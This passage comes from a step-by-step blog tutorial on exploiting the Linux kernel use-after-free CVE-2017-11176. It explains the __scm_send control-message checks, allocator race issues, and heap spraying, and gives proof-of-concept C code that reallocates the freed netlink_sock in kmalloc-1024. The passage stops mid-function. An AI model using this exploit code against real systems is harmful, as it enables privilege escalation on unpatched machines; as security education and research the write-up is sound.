<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tv</span><span class="p">.</span><span class="n">tv_sec</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="c1">// ... cut ...</span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="o">*</span><span class="n">timeo_p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAX_SCHEDULE_TIMEOUT</span><span class="p">;</span><span class="w">          </span><span class="c1">// &lt;-----</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tv</span><span class="p">.</span><span class="n">tv_sec</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">tv</span><span class="p">.</span><span class="n">tv_usec</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">    </span><span class="c1">// &lt;-----</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">                             </span><span class="c1">// &lt;-----</span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>In the end, if we call <em>setsockopt()</em> with the <em>SO_SNDTIMEO</em> option, and giving it a <em>struct timeval</em> filled with zero. It will set the timeout to MAX_SCHEDULE_TIMEOUT (i.e. block indefinitely). It does not require any specific privileges.</p><p>One problem solved!</p><p>The second problem is that we need to <strong>deal with the code that uses the control buffer data</strong>. It is called very early in <em>unix_dgram_sendmsg()</em>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">unix_dgram_sendmsg</span><span class="p">(</span><span class="k">struct</span> <span class="nc">kiocb</span><span class="w"> </span><span class="o">*</span><span class="n">kiocb</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"></span>
<span class="w">                  </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock_iocb</span><span class="w"> </span><span class="o">*</span><span class="n">siocb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kiocb_to_siocb</span><span class="p">(</span><span class="n">kiocb</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut (lots of declaration) ...</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">NULL</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">siocb</span><span class="o">-&gt;</span><span class="n">scm</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">siocb</span><span class="o">-&gt;</span><span class="n">scm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">tmp_scm</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">wait_for_unix_gc</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">scm_send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">siocb</span><span class="o">-&gt;</span><span class="n">scm</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">);</span><span class="w">     </span><span class="c1">// &lt;----- here</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>We already passed this check in the previous article but there is something different now:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="n">__inline__</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">scm_send</span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">,</span><span class="w"></span>
<span class="w">                   </span><span class="k">struct</span> <span class="nc">scm_cookie</span><span class="w"> </span><span class="o">*</span><span class="n">scm</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="n">forcecreds</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">scm</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">scm</span><span class="p">));</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">forcecreds</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">scm_set_cred</span><span class="p">(</span><span class="n">scm</span><span class="p">,</span><span class="w"> </span><span class="n">task_tgid</span><span class="p">(</span><span class="n">current</span><span class="p">),</span><span class="w"> </span><span class="n">current_cred</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="n">unix_get_peersec_dgram</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">scm</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">msg_controllen</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">         </span><span class="c1">// &lt;----- this is NOT true anymore</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">__scm_send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">scm</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>As you can see, we are now using the <strong>msg_control</strong> (hence <em>msg_controllen</em> is positive). That is, <strong>we can't bypass <em>__scm_send()</em> anymore and it needs to return 0</strong>.</p><p>Let's starts by exposing the "ancillary data object information" structure:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">__kernel_size_t</span><span class="w"> </span><span class="n">cmsg_len</span><span class="p">;</span><span class="w">   </span><span class="cm">/* data byte count, including hdr */</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w">             </span><span class="n">cmsg_level</span><span class="p">;</span><span class="w">   </span><span class="cm">/* originating protocol */</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w">             </span><span class="n">cmsg_type</span><span class="p">;</span><span class="w">    </span><span class="cm">/* protocol-specific type */</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>This is a <strong>16 bytes</strong> data structure which must be located at the very beginning of our "msg_control" buffer (the one with arbitrary data). Its usage actually depends on the socket type. One can see them as, "do something special" with the socket. For instance, in the UNIX socket, it can be used to pass "credentials" over a socket.</p><p><strong>The control message buffer (<em>msg_control</em>) can hold one or more control message(s). Each control message is composed of a header and the data.</strong></p><p>The first control message header is retrieved with the <strong>CMSG_FIRSTHDR()</strong> macro:</p><div class="highlight"><pre><span></span><code><span class="cp">#define CMSG_FIRSTHDR(msg)  __CMSG_FIRSTHDR((msg)-&gt;msg_control, (msg)-&gt;msg_controllen)</span>

<span class="cp">#define __CMSG_FIRSTHDR(ctl,len) ((len) &gt;= sizeof(struct cmsghdr) ? \</span>
<span class="cp">                  (struct cmsghdr *)(ctl) : \</span>
<span class="cp">                  (struct cmsghdr *)NULL)</span>
</code></pre></div><p>That is, it checks if the provided len in <em>msg_controllen</em> is greater than 16 bytes. If not, it means that the control message buffer does not even hold a control message header! In that case, it returns NULL. Otherwise, it returns the starting address of the first control message (i.e. <em>msg_control</em>).</p><p>In order to find the next control message, one must use the <strong>CMG_NXTHDR()</strong> to retrieve the starting address of the next control message header:</p><div class="highlight"><pre><span></span><code><span class="cp">#define CMSG_NXTHDR(mhdr, cmsg) cmsg_nxthdr((mhdr), (cmsg))</span>

<span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">cmsg_nxthdr</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="o">*</span><span class="n">__msg</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="o">*</span><span class="n">__cmsg</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">__cmsg_nxthdr</span><span class="p">(</span><span class="n">__msg</span><span class="o">-&gt;</span><span class="n">msg_control</span><span class="p">,</span><span class="w"> </span><span class="n">__msg</span><span class="o">-&gt;</span><span class="n">msg_controllen</span><span class="p">,</span><span class="w"> </span><span class="n">__cmsg</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">__cmsg_nxthdr</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">__ctl</span><span class="p">,</span><span class="w"> </span><span class="n">__kernel_size_t</span><span class="w"> </span><span class="n">__size</span><span class="p">,</span><span class="w"></span>
<span class="w">                           </span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="o">*</span><span class="n">__cmsg</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">__ptr</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">__ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="o">*</span><span class="p">)(((</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">__cmsg</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">  </span><span class="n">CMSG_ALIGN</span><span class="p">(</span><span class="n">__cmsg</span><span class="o">-&gt;</span><span class="n">cmsg_len</span><span class="p">));</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">__ptr</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">__ctl</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">__size</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">__ptr</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p><strong>This is not as complex as it looks!</strong>. It basically takes the current control message header address <em>cmsg</em> and adds <strong>cmsg_len</strong> bytes specified in the current control message header (plus some alignment if necessary). If the "next header" is out of the <em>total size</em> of the whole <em>control message buffer</em>, then it means there is no more header, it returns NULL. Otherwise, the computed pointer (i.e. next header) is returned.</p><p><strong>Beware! The <em>cmsg_len</em> is the len of the control message AND its header!</strong>.</p><p>Finally, there is a <em>sanity check</em> macro <strong>CMSG_OK()</strong> to check that the <em>current</em> control message size (i.e. <em>cmsg_len</em>) is not greater than the whole control message buffer:</p><div class="highlight"><pre><span></span><code><span class="cp">#define CMSG_OK(mhdr, cmsg) ((cmsg)-&gt;cmsg_len &gt;= sizeof(struct cmsghdr) &amp;&amp; \</span>
<span class="cp">                 (cmsg)-&gt;cmsg_len &lt;= (unsigned long) \</span>
<span class="cp">                 ((mhdr)-&gt;msg_controllen - \</span>
<span class="cp">                  ((char *)(cmsg) - (char *)(mhdr)-&gt;msg_control)))</span>
</code></pre></div><p>Alright, now let's look at the <strong>__scm_send()</strong> code which is the one doing something useful (eventually) with the control messages:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="nf">__scm_send</span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">scm_cookie</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="o">*</span><span class="n">cmsg</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">cmsg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CMSG_FIRSTHDR</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span><span class="w"> </span><span class="n">cmsg</span><span class="p">;</span><span class="w"> </span><span class="n">cmsg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CMSG_NXTHDR</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">cmsg</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">CMSG_OK</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">cmsg</span><span class="p">))</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">error</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmsg</span><span class="o">-&gt;</span><span class="n">cmsg_level</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SOL_SOCKET</span><span class="p">)</span><span class="w"></span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span><span class="w"></span>

<span class="w">          </span><span class="c1">// ... cut (skipped code) ...</span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut ...</span>

<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">     </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="nl">error</span><span class="p">:</span><span class="w"></span>
<span class="w">        </span><span class="n">scm_destroy</span><span class="p">(</span><span class="n">p</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>Our objective is to force <em>__scm_send()</em> to return 0 [3]. Because <strong>msg_controllen</strong> is the size of our reallocation (i.e. 1024), we will enter the loop [0] (i.e. <em>CMSG_FIRSTHDR(msg) != NULL</em>).</p><p>Because of the [1], the value in the <em>first control message header</em> should be valid. We will set it to 1024 (size of the whole control message buffer). Then, by specifying a value different than SOL_SOCKET (i.e. 1), we can skip the whole loop [2]. That is, the next control message header will be seeked by <em>CMSG_NXTHDR()</em> since the <strong>cmsg_len is equal to msg_controllen</strong> (i.e. there is only ONE control message), cmsg will be set to NULL and we will gracefully exit the loop and return zero [3]!</p><p>In other words, with this reallocation:</p><ul><li>we can <strong>NOT control the first 8 bytes</strong> of the reallocation buffer (it is the size=1024)</li><li>we have a <strong>constraint on the second field</strong> of the cmsg control header (value different than one)</li><li>The last 4 bytes of the header are <strong>free for use</strong> as well as the other <strong>1008 bytes</strong></li></ul><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/realloc_gadget.png" title="Reallocation gadget"><figcaption class="figcaption figure-caption text-center">realloc_gadget</figcaption></figure><p></p><p>Nice, we've got everything needed to reallocate in the kmalloc-1024 cache with (almost) arbitrary data. Before digging into the implementation, let's have a short study of what could possibly go wrong.</p><h2 id="what-could-possibly-go-wrong">What Could Possibly Go Wrong?</h2><p>In the <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#reallocation-introduction--slab-">Reallocation Introduction</a>, the <em>ideal</em> scenario case (i.e. fastest path) has been covered. However, what will happen if we don't hit that path? Things can go wrong...</p><p><strong>WARNING</strong>: We will not cover every path of <em>kmalloc()/kfree()</em> it is expected that you understand your allocator by now.</p><p>For instance, let's consider that the <em>netlink_sock</em> object is about to be free'd:</p><ol><li>If the <em>array_cache</em> is full, it will call <strong>cache_flusharray()</strong>. This will put <em>batchcount</em> free pointer to the <em>shared per-node</em> array_cache (if any) and call <strong>free_block()</strong>. That is, the <strong>next kmalloc() fastest path will not re-use the lastest free'd object</strong>. This breaks the LIFO property!</li><li>If it is about freeing the last "used" object in a <em>partial slab</em> it is moved to the slabs_free list.</li><li>If the cache already has "too much" free objects, the <em>free slab</em> is destroyed (i.e. pages are given back to the buddy)!</li><li>The buddy itself <em>may</em> initiate some "compaction" stuff (what about PCP?) and starts sleeping.</li><li>The scheduler decided to move your task to another CPU and the <em>array_cache</em> is per-cpu</li><li>The system (not because of you) is currently running out-of-memory and tries to reclaim memory from every subsystems/allocators, etc.</li></ol><p>There are other paths to consider, and the same goes for the <em>kmalloc()</em>... All of these issues considered that your task was <em>alone</em> in the system. But the story does not stop here!</p><p><strong>There are other tasks (including kernel ones) that concurrently use the <em>kmalloc-1024</em> cache. You are "in race" with them. A race that you <em>can</em> loose...</strong></p><p>For instance, you just free'd the <em>netlink_sock</em> object, but then another task also free'd a <em>kmalloc-1024</em> object. That is, you will need to <strong>allocate twice</strong> to reallocate the <em>netlink_sock</em> (LIFO). What if another task "stole it" (i.e. <em>raced</em> you)? Well... you can't reallocate it anymore until this very same task does not give it back (and hopefully hasn't been migrated to another cpu...). But then, how to detect it?</p><p>As you can see, lots of things can go wrong. This is the most critical path in the exploit: <em>after</em> freeing the <em>netlink_sock</em> object but <em>before</em> reallocating it. We cannot address all these issues in the article. This is for more advanced exploit and it requires stronger knowledge of the kernel. Reliable reallocation is a complex topic.</p><p>However, let's explain two basic techniques that solve some of the aforementioned issues:</p><ol><li>Fixing the CPU with <strong>sched_setaffinity()</strong> syscall. The <em>array_cache</em> is a per-CPU data structure. If you set a CPU mask to a single CPU at the beginning of the exploit, you are guaranteed to use the same <em>array_cache</em> when freeing and reallocating.</li><li><strong>Heap Spraying</strong>. By reallocating "a lot", we have a chance to reallocate the <em>netlink_sock</em> object even if other tasks also free'd some <em>kmalloc-1024</em> objects. In addition, if the <em>netlink_sock</em>'s slab is put at the end of the free slab list, we try to allocate all of them until a <em>cache_grow()</em> eventually occurs. However, this is pure guessing (remember: basic technique).</li></ol><p>Please check the implementation section to see how this is done.</p><h2 id="a-new-hope">A New Hope</h2><p>You've got scared by the last section? Do not worry, we are lucky this time. The object (<em>struct netlink_sock</em>) we are trying to exploit lies in the <strong>kmalloc-1024</strong>. This is an <em>awesome</em> cache because it is not used a lot by the kernel. To convince you, do the <em>poor man method</em> described in "Method #5" (cf. Detecting the object size) and observe the various general kmemcaches:</p><div class="highlight"><pre><span></span><code>watch -n <span class="m">0</span>.1 <span class="s1">'sudo cat /proc/slabinfo | egrep "kmalloc-|size-" | grep -vi dma'</span>
</code></pre></div><p>See? It does not move that much (at all?). Now look at "kmalloc-256", "kmalloc-192", "kmalloc-64", "kmalloc-32". Those are the bad guys... They are simply the most common kernel object sizes. Exploiting a UAF in those caches can quickly turn in hell. Of course, the "kmalloc activity" depends on your target and the processes running on it. But, the previous caches are <em>unstable</em> on almost all systems.</p><h2 id="reallocation-implementation">Reallocation Implementation</h2><p>Alright! It is time to get back to our PoC and start coding the reallocation.</p><p>Let's fix the <strong>array_cache</strong> issue by migrating all our threads into the CPU#0:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">migrate_to_cpu0</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">cpu_set_t</span><span class="w"> </span><span class="n">set</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">set</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">CPU_SET</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">set</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_sched_setaffinity</span><span class="p">(</span><span class="n">_getpid</span><span class="p">(),</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">set</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">set</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] sched_setaffinity"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Next, we want to check that we can use the "ancillary data buffer" primitive, let's probe the <em>optmem_max</em> sysctl value (via the <em>procfs</em>):</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="nf">can_use_realloc_gadget</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">bool</span><span class="w"> </span><span class="n">usable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_open</span><span class="p">(</span><span class="s">"/proc/sys/net/core/optmem_max"</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] open"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="c1">// TODO: fallback to sysctl syscall</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w"> </span><span class="c1">// we can't conclude, try it anyway or not ?</span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)))</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] read"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] optmem_max = %s"</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">atol</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">512</span><span class="p">)</span><span class="w"> </span><span class="c1">// only test if we can use the kmalloc-1024 cache</span>
<span class="w">    </span><span class="n">usable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span><span class="w"></span>

<span class="nl">out</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">_close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">usable</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>The next step is to prepare the control message buffer. Please note that <strong>g_realloc_data</strong> is declared globally, so every thread can access it. The proper <em>cmsg</em> fields are set:</p><div class="highlight"><pre><span></span><code><span class="cp">#define KMALLOC_TARGET 1024</span>

<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">g_realloc_data</span><span class="p">[</span><span class="n">KMALLOC_TARGET</span><span class="p">];</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">init_realloc_data</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="o">*</span><span class="n">first</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">memset</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">g_realloc_data</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">g_realloc_data</span><span class="p">));</span><span class="w"></span>

<span class="w">  </span><span class="c1">// necessary to pass checks in __scm_send()</span>
<span class="w">  </span><span class="n">first</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">g_realloc_data</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">first</span><span class="o">-&gt;</span><span class="n">cmsg_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">g_realloc_data</span><span class="p">);</span><span class="w"></span>
